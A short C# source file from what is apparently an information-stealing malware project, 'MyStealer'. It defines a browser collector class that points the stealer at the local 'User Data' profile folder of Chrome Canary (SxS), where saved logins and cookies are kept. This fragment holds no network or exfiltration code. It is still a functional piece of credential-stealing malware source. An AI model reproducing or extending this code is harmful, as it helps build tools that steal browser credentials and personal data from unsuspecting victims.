using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class ChromeSxS : Chromium
    {
        public override string Name => "Chrome Canary (SxS)";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome SxS", "User Data");
    }
}
